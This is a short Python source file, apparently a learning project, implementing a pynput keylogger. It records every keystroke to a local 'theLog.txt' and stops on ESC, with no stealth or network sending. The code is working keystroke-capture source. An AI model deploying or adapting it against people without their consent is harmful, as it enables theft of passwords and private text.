"""
    Python-Based Keylogger Project
    by Adinda
    Credits:
    Austin: https://www.youtube.com/watch?v=a-q5y8zosWk
    ncorbukL: https://github.com/ncorbuk/Python-Keylogger
    
    Added Feature: Stop Function
"""

import pynput.keyboard

class KeyboardEventLogger:
    def __init__(self):
        # Buffer to temporarily hold text, mainly for the Enter key cleanup
        self.logger = ""

    # Method to write a single keypress immediately 
    def append_key(self, pressed_key): 
        with open("theLog.txt", "a", encoding="utf-8") as new_file:
            new_file.write(pressed_key)

    # Flush Buffer
    def write_current_log(self):
        if self.logger:
             with open("theLog.txt", "a", encoding="utf-8") as new_file:
                 new_file.write(self.logger)
        self.logger = ""

    # Keypress Events Handler
    def on_key_press(self, key):
        try:
            pressed_key = str(key.char)
        except AttributeError:
            if key == key.space:
                pressed_key = " "
            elif key == key.enter:
                # Add marker to buffer and flush it immediately
                self.logger = self.logger + "[ENTER]\n"
                self.write_current_log() 
                return
            else:
                pressed_key = " " + str(key) + " "
        
        # Write the single keypress immediately
        self.append_key(pressed_key)
    
    # Stop Feature Using esc Key
    def on_key_release(self, key):
        # Returning False stops the pynput listener
        if key == pynput.keyboard.Key.esc:
            return False

    # Start Key Listener
    def start(self):
        print("Starting key listener. Press ESC key to stop")
        try:
            keyboard_Listener = pynput.keyboard.Listener(
                on_press = self.on_key_press,
                on_release = self.on_key_release
            )
            with keyboard_Listener:
                self.logger = ""
                keyboard_Listener.join()

            # Runs after listener is stopped by ESCAPE
            self.write_current_log()
            print("\nListener stopped because ESC key. Remaining log written in theLog.txt")
            
        except KeyboardInterrupt:
            # Runs if Ctrl+C is pressed
            self.write_current_log()
            print("\nListener stopped by Ctrl+C. Remaining log written in theLog.txt")


# Call The Function and Start 
KeyboardEventLogger().start()
